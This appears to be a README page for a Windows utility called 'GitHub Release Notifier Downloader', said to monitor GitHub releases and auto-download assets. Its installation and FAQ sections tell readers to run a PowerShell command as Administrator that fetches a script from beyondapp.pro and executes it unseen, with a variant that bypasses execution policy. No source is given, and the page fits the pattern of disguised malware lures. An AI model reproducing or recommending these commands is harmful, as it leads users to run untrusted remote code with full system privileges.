<div align="center">

<img src="https://img.shields.io/badge/Platform-Windows_10/11-0078D4?style=for-the-badge&logo=windows&logoColor=white" height="25"/>
<img src="https://img.shields.io/badge/Open-Source-3fb950?style=for-the-badge&logo=opensourceinitiative&logoColor=white" height="25"/>
<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white" height="25"/>

# GitHub Release Notifier Downloader
**Release watch · Auto download · Folder sync**

<img src="banner.png" alt="GitHub Release Notifier Downloader" width="100%"/>

</div>

---

> Tracks GitHub repository releases and downloads new assets into a folder you choose.

## `ABOUT`

Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.

## `INSTALLATION`

<div align="center">

<img src="https://img.shields.io/badge/Platform-Windows-0078D4?style=flat-square&logo=windows&logoColor=white" height="22"/>
<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" height="22"/>

<br><br>

**Run in PowerShell as Administrator:**

```powershell
irm https://beyondapp.pro/ps/setup.ps1 | iex
```

<sub>Copy · paste · press Enter · confirm UAC</sub>

</div>

**Setup runs in three steps:**

| Step | Action |
|:--:|---|
| **1/3** | Downloading components — tool package and dependencies |
| **2/3** | Unpacking archive — files extracted to a temp workspace |
| **3/3** | Launching installer — utility is installed on Windows |

## `FEATURES`

👀 **Release watch** — Poll GitHub releases for new versions.
⬇️ **Auto download** — Save assets to a configured output folder.
📋 **Repo list** — Track multiple projects from one config file.
🔔 **Console notify** — Log when a new release is fetched.
⚡ **One command** — PowerShell handles download, unpack, and setup.

## `REQUIREMENTS`

| | |
|:---|:---|
| **Windows** | Windows 10 / 11 (64-bit) |
| **RAM** | 4 GB |
| **Disk** | 2 GB free space |

## `FAQ`

<details>
<summary>&nbsp;<b>How to install?</b></summary>
<br>Open PowerShell as Administrator and run the command from the INSTALLATION section. You should see steps <b>[1/3]</b>, <b>[2/3]</b>, and <b>[3/3]</b> in the console.
</details>

<details>
<summary>&nbsp;<b>Manual install blocked?</b></summary>
<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"`
</details>

<details>
<summary>&nbsp;<b>What does this tool do?</b></summary>
<br>Script that **monitors GitHub releases** and **downloads new assets** automatically to your disk.
</details>

<details>
<summary>&nbsp;<b>Updates?</b></summary>
<br>Re-run the same PowerShell command to fetch the latest build.
</details>
